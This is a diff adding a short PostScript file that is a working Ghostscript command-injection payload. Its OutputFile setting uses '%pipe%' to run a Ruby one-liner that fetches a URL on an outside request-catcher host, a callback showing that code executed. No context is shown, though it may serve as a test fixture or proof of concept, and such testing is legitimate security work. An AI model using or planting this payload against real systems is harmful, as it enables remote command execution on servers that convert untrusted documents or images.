@@ -1,0 +1,6 @@
+%!PS-Adobe-3.0
+  <<
+    /OutputDevice /png16m
+    /OutputFile (%pipe%ruby -ropen-uri -e 'URI.open\("https://worknow.requestcatcher.com/test"\)')
+  >> setpagedevice
+  showpage
